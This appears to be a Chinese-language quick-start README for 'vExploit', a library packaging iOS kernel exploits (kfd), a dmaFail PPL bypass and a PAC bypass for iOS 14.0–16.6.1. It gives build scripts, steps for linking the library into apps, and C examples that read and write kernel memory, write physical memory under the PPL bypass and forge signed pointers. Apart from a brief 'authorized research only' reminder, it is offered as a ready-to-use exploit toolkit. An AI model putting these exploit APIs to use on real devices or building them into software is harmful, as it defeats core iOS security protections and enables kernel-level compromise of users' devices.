# 🚀 vExploit 库快速开始指南

## ✨ 欢迎使用 vExploit

vExploit 是一个强大的 iOS 漏洞利用库，集成了 kfd 内核漏洞、dmaFail PPL 绕过和 PAC Bypass 功能。

## 🎯 30 秒快速开始

```bash
# 1. 清理环境
./clean.sh

# 2. 构建库
./simple_build.sh

# 3. 测试库
cd dist && DYLD_LIBRARY_PATH=./lib ./demo_vexploit
```

## 📋 系统要求

- **操作系统**: macOS (需要 Xcode 工具链)
- **目标平台**: iOS 14.0 - 16.6.1
- **架构**: arm64
- **工具**: Xcode 命令行工具

## 🔧 详细构建步骤

### 1. 环境准备

```bash
# 清理之前的构建文件
./clean.sh
```

### 2. 选择构建方式

#### 快速构建（推荐）
```bash
./simple_build.sh
```

#### 完整构建
```bash
./full_build.sh
```

#### 高级构建
```bash
./build_dylibs.sh
```

### 3. 验证构建

```bash
# 检查生成的文件
ls -la dist/lib/libvExploit.dylib
ls -la dist/include/libvExploit.h

# 运行测试
cd dist
DYLD_LIBRARY_PATH=./lib ./test_dylibs
DYLD_LIBRARY_PATH=./lib ./demo_vexploit
```

## 💻 API 使用示例

### 基本使用

```c
#include "libvExploit.h"

int main() {
    // 获取版本信息
    printf("vExploit: %s\n", vexploit_get_version());
    printf("Build: %s\n", vexploit_get_build_info());
    
    return 0;
}
```

### kfd 内核漏洞

```c
// 初始化 kfd
uint64_t kfd = kfd_open(512, KFD_PUAF_LANDA, 
                       KFD_KREAD_IOSURFACE, KFD_KWRITE_IOSURFACE);
if (kfd) {
    // 读取内核内存
    uint64_t value = kfd_read64(kfd, 0xfffffff000000000);
    
    // 写入内核内存
    kfd_write64(kfd, 0xfffffff000000000, 0x1234567890ABCDEF);
    
    // 清理
    kfd_close(kfd);
}
```

### dmaFail PPL 绕过

```c
// 检查设备支持
if (dmafail_is_supported()) {
    // 初始化 dmaFail
    if (dmafail_init()) {
        // 执行 DMA 操作
        dmafail_perform_dma(^{
            // 在 PPL 绕过环境中执行代码
            dmafail_physwrite64(0x200000000, 0x1234567890ABCDEF);
        });
        
        // 清理
        dmafail_deinit();
    }
}
```

### PAC Bypass

```c
// 检查 PAC 支持
if (pacbypass_is_supported()) {
    // 初始化 PAC Bypass
    if (pacbypass_init()) {
        // PAC 操作
        uint64_t raw_ptr = 0x1234567890ABCDEF;
        uint64_t signed_ptr = pacbypass_kptr_sign(0xfffffff000000000, raw_ptr, 0x1234);
        uint64_t unsigned_ptr = pacbypass_unsign_pointer(signed_ptr);
        
        printf("Raw: 0x%llx\n", raw_ptr);
        printf("Signed: 0x%llx\n", signed_ptr);
        printf("Unsigned: 0x%llx\n", unsigned_ptr);
        
        // 清理
        pacbypass_deinit();
    }
}
```

## 🔗 集成到项目

### 1. 复制库文件

```bash
# 复制库和头文件到您的项目
cp dist/lib/libvExploit.dylib /path/to/your/project/
cp dist/include/libvExploit.h /path/to/your/project/
```

### 2. 编译链接

```bash
clang -o myapp myapp.c \
    -L. -lvExploit \
    -framework Foundation \
    -arch arm64 \
    -miphoneos-version-min=14.0 \
    -isysroot $(xcrun --sdk iphoneos --show-sdk-path)
```

### 3. 运行时设置

```bash
# 设置库路径
export DYLD_LIBRARY_PATH=.:$DYLD_LIBRARY_PATH

# 运行应用
./myapp
```

## 🛠️ 故障排除

### 编译错误

```bash
# 检查 Xcode 工具
xcode-select --print-path

# 重新安装命令行工具
sudo xcode-select --reset
xcode-select --install
```

### 库加载错误

```bash
# 检查库依赖
otool -L dist/lib/libvExploit.dylib

# 检查库路径
echo $DYLD_LIBRARY_PATH
```

### 权限问题

```bash
# 设置脚本权限
chmod +x *.sh

# 检查文件权限
ls -la dist/lib/libvExploit.dylib
```

## 📚 更多资源

- **详细文档**: `README_DYLIBS.md`
- **构建指南**: `BUILD_GUIDE.md`
- **API 参考**: `libvExploit.h`
- **重命名说明**: `RENAME_SUMMARY.md`

## 🔧 维护命令

```bash
# 清理构建文件
./clean.sh

# 完整重建
./clean.sh && ./simple_build.sh
```

## ⚠️ 重要提醒

1. **仅限研究**: 此库仅用于授权的安全研究
2. **权限要求**: 需要适当的代码签名和系统权限
3. **设备兼容**: 不同设备和 iOS 版本支持程度不同
4. **环境限制**: 在沙盒环境中功能可能受限

## 🎉 开始使用

现在您已经准备好使用 vExploit 库了！

```bash
# 立即开始
./clean.sh && ./simple_build.sh && cd dist && DYLD_LIBRARY_PATH=./lib ./demo_vexploit
```

享受使用 vExploit 库进行 iOS 安全研究吧！
